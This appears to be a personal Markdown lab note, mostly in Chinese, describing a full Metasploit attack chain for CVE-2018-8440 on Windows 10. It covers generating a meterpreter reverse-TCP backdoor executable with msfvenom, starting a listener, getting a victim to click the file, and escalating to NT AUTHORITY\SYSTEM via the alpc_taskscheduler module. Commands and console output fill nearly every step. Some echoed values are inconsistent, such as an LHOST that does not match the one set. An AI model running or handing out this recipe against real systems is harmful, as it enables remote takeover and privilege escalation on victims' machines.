# Metasploit-Note

## CVE-2018-8440
----
```
Attacker IP : 192.168.1.1
Victim IP : 192.168.1.2
Victim OS : Windows 10x64
```

Step 1. 產生後門程式
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > backdoor.exe
```
Step 2. 監聽回傳設定
```
$ msfconsole
msf > use mulit/handler
msf exploit(mulit/handler) >  set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(mulit/handler) >  set LHOST 192.168.1.1
LHOST => 192.168.59.144
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.1:4444
```
Step 3. 誘使受害端點擊 backdoor.exe，並取得一般使用者權限
```
[*] Sending stage (206403 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.1:4444 -> 192.168.1.2:50228) at 2018-10-01 08:40:10 +0800
meterpreter > getuid
Server username: DESKTOP-E6KTUJB\User
meterpreter > background 
[*] Backgrounding session 1...
```
Step 4. 查看監聽對象資訊
```
msf exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  1         meterpreter x64/windows  DESKTOP-E6KTUJB\User @ DESKTOP-E6KTUJB  192.168.1.1:4444 -> 192.168.1.2:50228 (192.168.59.146)
```
Step 5. 使用 CVE-2018-8440 漏洞腳本，並取得系統權限
```
msf exploit(multi/handler) > use exploit/windows/local/alpc_taskscheduler 
msf exploit(windows/local/alpc_taskscheduler) > show options 

Module options (exploit/windows/local/alpc_taskscheduler):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS                   no        Name of process to spawn and inject dll into.
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows 10 x64


msf exploit(windows/local/alpc_taskscheduler) > set session 1
session => 1
msf exploit(windows/local/alpc_taskscheduler) > exploit

[*] Started reverse TCP handler on 192.168.1.1:4444 
[*] Checking target...
[*] Target Looks Good... trying to start notepad.exe
[*] Launching notepad.exe to host the exploit...
[+] Process 7976 launched.
[*] Writing payload dll into process 7976 memory
[*] Reflectively injecting the exploit DLL into 7976...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Command shell session 2 opened (192.168.1.1:4444 -> 192.168.1.2:50258) at 2018-10-01 09:16:31 +0800

C:\Windows\system32>whoami
whoami
nt authority\system
```
# Notes
* Metasploit 腳本更新
  Kali 中 .rb 的存放路徑為 /usr/share/metasploit-framework/modules/exploits 中

  將 .rb 放進去資料夾後，重新載入
  ```
  $ msfconsole
  msf > reload_all
  [*] Reloading modules from all module paths...
  ```
* 查詢可產生後門程式的類型
  ```
  $ msfvenom -l payloads
  ```
# Reference
[metasploit-framework](https://github.com/rapid7/metasploit-framework)
